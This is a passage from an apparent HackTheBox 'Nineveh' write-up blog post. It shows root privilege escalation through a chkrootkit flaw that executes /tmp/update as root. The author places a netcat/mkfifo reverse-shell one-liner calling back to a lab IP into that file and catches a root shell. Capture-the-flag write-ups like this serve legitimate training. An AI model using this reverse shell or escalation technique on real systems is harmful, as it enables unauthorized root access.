+<span class="err">drwxr-xr-x  10 root   root    4096 Jul  2  2017 usr/</span>
+<span class="err">drwxr-xr-x  14 root   root    4096 Jul  2  2017 var/</span>
+<span class="err">lrwxrwxrwx   1 root   root      29 Jul  2  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic</span>
+</pre></div>
+
+
+<p>inside the directory there are some text files which look they are generated every minute:</p>
+<div class="highlight"><pre><span></span><span class="err">amrois@nineveh:/report$ ls -l</span>
+<span class="err">total 24</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="err">amrois@nineveh:/report$ ls -l</span>
+<span class="err">total 32</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:23 report-20-01-19:15:23.txt</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="err">amrois@nineveh:/report$ ls -l</span>
+<span class="err">total 40</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:23 report-20-01-19:15:23.txt</span>
+<span class="err">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:24 report-20-01-19:15:24.txt</span>
+</pre></div>
+
+
+<p>This may be an indication that a cronjob is running.</p>
+<div class="highlight"><pre><span></span><span class="n">amrois</span><span class="nv">@nineveh:</span><span class="o">/</span><span class="n">report</span><span class="nv">$</span> <span class="nv">crontab</span> <span class="o">-</span><span class="n">l</span>
+<span class="c1"># Edit this file to introduce tasks to be run by cron.</span>
+<span class="c1"># </span>
+<span class="c1"># Each task to run has to be defined through a single line</span>
+<span class="c1"># indicating with different fields when the task will be run</span>
+<span class="c1"># and what command to run for the task</span>
+<span class="c1"># </span>
+<span class="c1"># To define the time you can provide concrete values for</span>
+<span class="c1"># minute (m), hour (h), day of month (dom), month (mon),</span>
+<span class="c1"># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# </span>
+<span class="c1"># Notice that tasks will be started based on the cron&#39;s system</span>
+<span class="c1"># daemon&#39;s notion of time and timezones.</span>
+<span class="c1"># </span>
+<span class="c1"># Output of the crontab jobs (including errors) is sent through</span>
+<span class="c1"># email to the user the crontab file belongs to (unless redirected).</span>
+<span class="c1"># </span>
+<span class="c1"># For example, you can run a backup of all your user accounts</span>
+<span class="c1"># at 5 a.m every week with:</span>
+<span class="c1"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+<span class="c1"># </span>
+<span class="c1"># For more information see the manual pages of crontab(5) and cron(8)</span>
+<span class="c1"># </span>
+<span class="c1"># m h  dom mon dow   command</span>
+<span class="o">*</span><span class="sr">/10 * * * * /</span><span class="n">usr</span><span class="sr">/sbin/</span><span class="n">report</span><span class="o">-</span><span class="k">reset</span><span class="o">.</span><span class="n">sh</span>
+</pre></div>
+
+
+<p>The above crontab indicates there is a script running every 10 minutes. </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+
+rm -rf /report/*.txt
+</pre></div>
+</td></tr></table>
+
+<p>and the above confirms this is a script that empties the report directory. We still need to find out what generates these reports. I copied some of the rows of the report on google and I found multiple results (i.e. https://www.linuxquestions.org/questions/fedora-35/when-i-chkrootkit-it-says-354711/) referring to <a href="http://www.chkrootkit.org/">chkrootkit</a>. So I am pretty sure it's the application generating the reports.</p>
+<p>Having a look with searchsploit I found exploit 33899 which in summary states the following:</p>
+<div class="highlight"><pre><span></span><span class="n">Steps</span> <span class="k">to</span> <span class="n">reproduce</span><span class="p">:</span>
+
+<span class="o">-</span> <span class="n">Put</span> <span class="n">an</span> <span class="n">executable</span> <span class="n">file</span> <span class="n">named</span> <span class="s1">&#39;update&#39;</span> <span class="k">with</span> <span class="n">non</span><span class="o">-</span><span class="n">root</span> <span class="k">owner</span> <span class="k">in</span> <span class="o">/</span><span class="n">tmp</span> <span class="p">(</span><span class="k">not</span>
+<span class="n">mounted</span> <span class="n">noexec</span><span class="p">,</span> <span class="n">obviously</span><span class="p">)</span>
+<span class="o">-</span> <span class="n">Run</span> <span class="n">chkrootkit</span> <span class="p">(</span><span class="k">as</span> <span class="n">uid</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="k">Result</span><span class="p">:</span> <span class="n">The</span> <span class="n">file</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="k">update</span> <span class="n">will</span> <span class="n">be</span> <span class="n">executed</span> <span class="k">as</span> <span class="n">root</span><span class="p">,</span> <span class="n">thus</span> <span class="n">effectively</span>
+<span class="n">rooting</span> <span class="n">your</span> <span class="n">box</span><span class="p">,</span> <span class="k">if</span> <span class="n">malicious</span> <span class="n">content</span> <span class="k">is</span> <span class="n">placed</span> <span class="n">inside</span> <span class="n">the</span> <span class="n">file</span><span class="p">.</span>
+</pre></div>
+
+
+<p>So I create a file named update in the /tmp directory and I punt a shell inside:</p>
+<div class="highlight"><pre><span></span><span class="err">amrois@nineveh:/tmp$ cat update</span>
+<span class="err">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.5 1234 &gt;/tmp/f</span>
+</pre></div>
+
+
+<p>and after waiting around 1 minute I get the shell back:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Tools</span><span class="o">/</span><span class="n">linenum</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">1234</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">1234</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.5</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.43</span><span class="o">]</span><span class="w"> </span><span class="mi">45922</span><span class="w"></span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">:</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">tty</span><span class="p">;</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">turned</span><span class="w"> </span><span class="k">off</span><span class="w"></span>
+<span class="err">#</span><span class="w"> </span><span class="n">id</span><span class="w"></span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="err"># cat root.txt            </span>
+<span class="err">8a############################3a</span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
